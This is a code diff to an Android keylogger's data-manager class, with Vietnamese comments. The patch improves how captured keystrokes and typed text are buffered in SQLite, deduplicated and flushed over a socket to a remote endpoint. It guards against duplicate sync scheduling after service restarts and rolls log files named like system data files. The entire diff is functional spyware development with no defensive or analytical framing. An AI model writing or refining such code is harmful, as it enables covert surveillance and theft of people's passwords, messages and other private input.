@@ -38,6 +38,7 @@ public class KeyloggerDataManager {
     private final KeystrokeDatabase database;
     private ConnectivityManager.NetworkCallback networkCallback;
     private final AtomicBoolean socketListenerRegistered = new AtomicBoolean(false);
+    private final AtomicBoolean syncStarted = new AtomicBoolean(false);
 
     /** Giảm từ 15s xuống 5s để giảm độ trễ end-to-end */
     private static final int FLUSH_INTERVAL_SECONDS = 5;
@@ -110,6 +111,9 @@ public class KeyloggerDataManager {
      * Bắt đầu network sync định kỳ + lắng nghe sự kiện socket connect để flush ngay.
      */
     public void startNetworkSync() {
+        // Chỉ schedule một lần duy nhất, tránh duplicate khi service bị restart
+        if (!syncStarted.compareAndSet(false, true)) return;
+
         // Flush định kỳ
         scheduler.scheduleAtFixedRate(() -> {
             if (!memoryBuffer.isEmpty() || database.getUnsyncedCount() > 0) {
@@ -156,15 +160,32 @@ public class KeyloggerDataManager {
             liveArray.put(entry);
         }
 
-        // Lấy unsynced rows từ SQLite
+        // Build dedup keys từ live entries để lọc trùng với offline
+        java.util.Set<String> liveKeys = new java.util.HashSet<>();
+        for (int i = 0; i < liveArray.length(); i++) {
+            try {
+                JSONObject e = liveArray.getJSONObject(i);
+                liveKeys.add(e.optLong("ts") + "|" + e.optString("eventType") + "|" + e.optString("txt"));
+            } catch (Exception ignored) {}
+        }
+
+        // Lấy unsynced rows từ SQLite, lọc bỏ entry đã có trong live
         List<JSONObject> unsynced = database.getUnsynced(OFFLINE_BATCH_SIZE);
         List<Long> syncedIds = new ArrayList<>();
         JSONArray offlineBatch = new JSONArray();
 
         for (JSONObject obj : unsynced) {
-            offlineBatch.put(obj);
             try {
-                syncedIds.add(obj.getLong("id"));
+                long dbId = obj.getLong("id");
+                String key = obj.optLong("ts") + "|" + obj.optString("eventType") + "|" + obj.optString("txt");
+                if (liveKeys.contains(key)) {
+                    // Đã có trong live → chỉ mark synced, không gửi lại
+                    syncedIds.add(dbId);
+                } else {
+                    // Không trùng → gửi trong offlineBatch
+                    offlineBatch.put(obj);
+                    syncedIds.add(dbId);
+                }
             } catch (Exception ignored) {}
         }
 
@@ -175,7 +196,7 @@ public class KeyloggerDataManager {
             JSONObject json = new JSONObject();
             json.put("live", liveArray);
             json.put("offlineBatch", offlineBatch);
-            json.put("offlineCount", unsynced.size());
+            json.put("offlineCount", offlineBatch.length());
             json.put("totalQueued", database.getUnsyncedCount());
             json.put("timestamp", System.currentTimeMillis());
             json.put("date", new SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.US).format(new Date()));
@@ -186,7 +207,8 @@ public class KeyloggerDataManager {
                 if (!syncedIds.isEmpty()) {
                     database.markSynced(syncedIds);
                 }
-                Log.d("KeyloggerDM", "Flushed " + liveArray.length() + " live + " + unsynced.size() + " offline entries");
+                Log.d("KeyloggerDM", "Flushed " + liveArray.length() + " live + " + offlineBatch.length() + " offline entries ("
+                    + (unsynced.size() - offlineBatch.length()) + " dupes skipped)");
             }
         } catch (Exception e) {
             Log.e("KeyloggerDM", "Socket send failed", e);
@@ -213,15 +235,12 @@ public class KeyloggerDataManager {
         networkCallback = new ConnectivityManager.NetworkCallback() {
             @Override
             public void onAvailable(Network network) {
-                try {
-                    Thread.sleep(2000);
-                } catch (InterruptedException ignored) {
-                    Thread.currentThread().interrupt();
-                }
-                if (database.getUnsyncedCount() > 0) {
-                    Log.d("KeyloggerDM", "Network restored — flushing " + database.getUnsyncedCount() + " queued entries");
-                    flushToNetwork();
-                }
+                scheduler.schedule(() -> {
+                    if (database.getUnsyncedCount() > 0) {
+                        Log.d("KeyloggerDM", "Network restored — flushing " + database.getUnsyncedCount() + " queued entries");
+                        flushToNetwork();
+                    }
+                }, 2, TimeUnit.SECONDS);
             }
         };
 
@@ -239,6 +258,11 @@ public class KeyloggerDataManager {
     }
 
     private void appendToFile(String line) {
+        // Cập nhật logFile nếu đã sang ngày mới (tránh ghi nhầm file của ngày cũ)
+        String todayFilename = "system_" + new SimpleDateFormat("yyyyMMdd", Locale.US).format(new Date()) + ".dat";
+        if (!logFile.getName().equals(todayFilename)) {
+            logFile = new File(logFile.getParentFile(), todayFilename);
+        }
         try (FileWriter fw = new FileWriter(logFile, true)) {
             fw.write(line);
             fw.write('\n');
